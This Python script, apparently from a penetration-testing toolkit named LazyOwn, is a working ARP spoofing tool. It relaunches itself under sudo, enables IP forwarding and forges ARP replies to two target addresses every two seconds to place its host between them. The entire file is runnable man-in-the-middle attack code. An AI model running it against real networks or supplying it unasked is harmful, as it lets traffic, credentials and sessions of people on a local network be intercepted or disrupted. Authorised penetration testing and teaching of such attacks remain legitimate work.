#!/usr/bin/env python3
# _*_ coding: utf8 _*_

import os
import argparse
from scapy.all import ARP, Ether, srp, send, conf
import socket
import fcntl
import struct
import time
import sys

DEBUG = 0

# Verificar y relanzar con sudo si es necesario
def check_sudo():
    if os.geteuid() != 0:
        print("[S] Este script necesita permisos de superusuario. Relanzando con sudo...")
        args = ['sudo', sys.executable] + sys.argv
        os.execvpe('sudo', args, os.environ)

check_sudo()

def enable_ip_forward():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forward():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_local_ip(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', bytes(ifname[:15], 'utf-8'))
    )[20:24])

def get_mac(ip, device, retries=3, timeout=5):
    conf.iface = device
    ip_layer = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / ip_layer
    if DEBUG == 1:
        print(f"[DEBUG] Enviando paquete ARP a {ip} desde dispositivo {device}")

    for i in range(retries):
        answer = srp(final_packet, timeout=timeout, verbose=False)[0]
        if DEBUG == 1:
            print(f"[DEBUG] Respuesta recibida en intento {i+1}: {answer}")
        if answer:
            mac = answer[0][1].hwsrc
            return mac
        if DEBUG == 1:
            print(f"[ERROR] No response for IP: {ip} on attempt {i+1}")

    return None

def spoofer(target, spoofed, device):
    mac = get_mac(target, device)
    if mac is None:
        if DEBUG == 1:
            print(f"[ERROR] Could not find MAC address for {target}")
        return
    spoofer_mac = ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    send(spoofer_mac, verbose=False)
    if DEBUG == 1:
        print(f"[DEBUG] Enviando paquete ARP de {spoofed} a {target} con MAC {mac}")

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("target1", help="First target IP address (e.g., 192.168.1.92)")
    parser.add_argument("target2", help="Second target IP address (e.g., 192.168.1.1)")
    parser.add_argument("--device", required=True, help="Network device (e.g., eth0, wlan0)")

    args = parser.parse_args()

    local_ip = get_local_ip(args.device)
    if DEBUG == 1:
        print(f"[DEBUG] Local IP for device {args.device} is {local_ip}")

    enable_ip_forward()
    
    try:
        print(f"[;,;] Corriendo LazyOwn ARPSpoofing in DEBUG MODE: {DEBUG}")
        while True:
            if args.target1 != local_ip:
                spoofer(args.target1, args.target2, args.device)
            if args.target2 != local_ip:
                spoofer(args.target2, args.target1, args.device)
            time.sleep(2)  # Pausa para evitar el envío continuo excesivo de paquetes
    except KeyboardInterrupt:
        disable_ip_forward()
        print("\n[INFO] LazyOwn ARPSpoofing detenido.")
        exit(0)

if __name__ == "__main__":
    main()
